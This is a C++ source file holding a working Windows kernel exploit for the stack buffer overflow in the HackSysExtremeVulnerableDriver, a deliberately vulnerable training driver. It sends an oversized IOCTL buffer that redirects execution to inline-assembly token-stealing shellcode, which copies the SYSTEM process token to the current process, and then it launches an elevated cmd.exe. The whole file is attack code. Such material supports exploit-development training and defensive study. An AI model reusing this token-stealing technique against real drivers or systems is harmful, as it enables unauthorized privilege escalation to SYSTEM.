#include <iostream>
#include <Windows.h>

void pwn() {
	__asm {
		pushad
		xor eax, eax
		mov eax, fs:[eax + 124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4
	SearchSystemPID:
			mov eax, [eax + 0b8h]
			sub eax, 0b8h
			cmp[eax + 0b4h], edx
			jne SearchSystemPID
		mov edx, [eax + 0f8h]
		mov[ecx + 0f8h], edx
		popad
		xor eax, eax
		add esp, 12
		pop ebp
		ret 8
	}
}

static void cmd() {
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) {
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

int main()
{
	std::cout << "BufferOverflowStack!\n";
	DWORD retLength = 0;
	unsigned char inBuffer[0x1000] = { 0 };
	memset(inBuffer, 'A', 0x1000);

	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	*(DWORD*)(inBuffer + 0x820) = (DWORD)&pwn;
	DeviceIoControl(hDevice, 0x222003, inBuffer, 0x824, NULL, 0, &retLength, NULL);
	cmd();
	return 0;
}
